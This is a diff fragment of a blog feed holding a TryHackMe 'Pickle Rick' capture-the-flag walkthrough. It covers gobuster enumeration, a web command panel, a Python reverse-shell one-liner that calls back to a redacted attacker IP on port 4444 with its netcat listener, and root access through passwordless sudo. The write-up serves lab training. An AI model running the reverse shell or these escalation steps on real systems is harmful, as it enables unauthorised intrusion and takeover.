-===============================================================
-/assets (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2021/01/06 22:00:07 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nothing was found that I didn’t already know, so I ran a second gobuster however this time I included some common extensions.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.116.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,log,txt
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.116.216
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     html,php,log,txt
-[+] Timeout:        10s
-===============================================================
-2021/01/06 22:00:46 Starting gobuster
-===============================================================
-/login.php (Status: 200)
-/assets (Status: 301)
-/portal.php (Status: 302)
-/index.html (Status: 200)
-/robots.txt (Status: 200)
-/denied.php (Status: 302)
-/server-status (Status: 403)
-/clue.txt (Status: 200)
-===============================================================
-2021/01/06 22:16:54 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;login.php and clue.txt look interesting, going to http://10.10.116.216/clue.txt provides:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Look around the file system for the other ingredient.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Not really much of a clue so I looked at login.php&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After trying some common default credentials I was able to log in with the username found in the source code and the word found in robots.txt.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/command.png&quot; alt=&quot;command&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;All the links expect ‘Commands’ directs to http://10.10.116.216/denied.php so I tried some basic command such as ls, id, pwd, whoami and they all work.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/ls.png&quot; alt=&quot;ls&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;However when I try and cat Sup3rS3cretPickl3Ingred.txt I get an error.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/commanddisabled.png&quot; alt=&quot;commanddisabled&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Fortunately I can just web browse directly to the file http://10.10.116.216/Sup3rS3cretPickl3Ingred.txt, 1 down 2 to go.&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;I want to get a shell on the box, so I checked for python or python3.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/python3.png&quot; alt=&quot;python3&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Great I can use python3 to get a reverse shell assuming the commands not blocked. Using the following command I get a shell!&lt;/p&gt;
-
-&lt;p&gt;/usr/bin/python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“&lt;REDACTED&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/REDACTED&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [&amp;lt;REDACTED&amp;gt;] from (UNKNOWN) [10.10.116.216] 37984
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Although I need to search for the other 2 ingredients. I wanted to escalate my privilages, I checked ‘sudo -l’ and I can run any sudo command with out a password so I do a simple ‘sudo su’ to become root.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
-Matching Defaults entries for www-data on
-    ip-10-10-116-216.eu-west-1.compute.internal:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on
-        ip-10-10-116-216.eu-west-1.compute.internal:
-    (ALL) NOPASSWD: ALL
-$ sudo su
-id
-uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now its just a case of finding the ingredient files which can be found in /home/rick and /root.&lt;/p&gt;
-
-&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry></feed>
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry></feed>
